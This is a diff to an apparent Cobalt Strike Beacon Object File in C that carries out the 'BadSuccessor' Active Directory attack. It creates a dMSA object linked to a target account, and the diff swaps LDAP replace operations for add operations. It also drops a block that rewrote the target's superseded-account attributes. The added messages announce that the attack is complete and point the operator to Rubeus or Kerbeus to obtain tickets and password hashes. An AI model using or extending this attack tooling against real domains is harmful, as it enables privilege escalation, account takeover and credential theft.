@@ -135,15 +135,15 @@ void go(char *args, int len) {
     linkAttr.mod_type   = "msDS-ManagedAccountPrecededByLink";
     linkAttr.mod_values = linkVals;
 
-    encAttr.mod_op     = LDAP_MOD_REPLACE;
+    encAttr.mod_op     = LDAP_MOD_ADD;
     encAttr.mod_type   = "msDS-SupportedEncryptionTypes";
     encAttr.mod_values = encVals;
 
-    uacAttr.mod_op     = LDAP_MOD_REPLACE;
+    uacAttr.mod_op     = LDAP_MOD_ADD;
     uacAttr.mod_type   = "userAccountControl";
     uacAttr.mod_values = uacVals;
 
-    sdAttr.mod_op     = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
+    sdAttr.mod_op     = LDAP_MOD_ADD | LDAP_MOD_BVALUES;
     sdAttr.mod_type   = "msDS-GroupMSAMembership";
     sdAttr.mod_bvalues = sdVals;
 
@@ -164,38 +164,11 @@ void go(char *args, int len) {
     result = WLDAP32$ldap_add_s(ld, childDn, mods);
     if (result != LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add entry: %s\n", WLDAP32$ldap_err2string(result));
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added dMSA object: %s\n", dMSAname);
+        goto cleanup;
     }
-
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to write target object for account takeover\n");
-
-    // Modify the target object to sync the new dMSA
-
-    LDAPMod superSedeAttr, acctStateAttr;
-    LDAPMod *modChanges[3];
-
-    char *superSedeVals[] = { childDn, NULL };
-    char *acctStateVals[] = { "2", NULL };
-
-    superSedeAttr.mod_op     = LDAP_MOD_REPLACE;
-    superSedeAttr.mod_type   = "msDS-SupersededManagedAccountLink";
-    superSedeAttr.mod_values = superSedeVals;
-
-    acctStateAttr.mod_op     = LDAP_MOD_REPLACE;
-    acctStateAttr.mod_type   = "msDS-SupersededServiceAccountState";
-    acctStateAttr.mod_values = acctStateVals;
-
-    modChanges[0] = &superSedeAttr;
-    modChanges[1] = &acctStateAttr;
-    modChanges[2] = NULL;
-
-    result = WLDAP32$ldap_modify_s(ld, target, modChanges);
-    if (result != LDAP_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to modify target object: %s\n", WLDAP32$ldap_err2string(result));
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully modified target object for takeover: %s\n", target);
-    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added dMSA object: %s\n", dMSAname);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] BadSuccessor attack complete. The dMSA object is now linked to the target.\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Use Rubeus or Kerbeus BOF to retrieve TGS and password hash.\n");
 
 cleanup:
     if (ld != NULL) {
